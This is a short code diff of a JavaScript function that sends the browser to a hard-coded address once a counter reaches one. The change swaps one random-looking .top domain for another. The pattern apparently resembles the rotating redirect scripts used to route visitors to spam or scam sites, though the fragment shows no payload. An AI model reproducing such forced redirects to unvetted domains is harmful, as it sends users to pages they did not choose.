@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://ytteamsp.top";
+		var url="https://wosottefot.top";
 		window.location=url;
 	}
 }
